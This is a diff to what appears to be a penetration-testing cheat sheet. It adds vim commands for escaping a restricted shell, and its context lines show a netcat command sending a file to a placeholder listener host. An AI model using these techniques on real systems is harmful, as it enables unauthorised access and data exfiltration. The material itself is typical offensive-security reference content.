@@ -185,7 +185,16 @@ nc -nv listener_ip 80 < input.txt
 #wait some time depending on file size: 10 seconds to 10 minutes...
 cat output.txt
 ```
+## Breaking out of restricted shell
 
+### vim
+
+breaking out using vim 
+```
+vim
+:set shell=/bin/sh
+:shell
+```
 
 # /etc/passwd
 
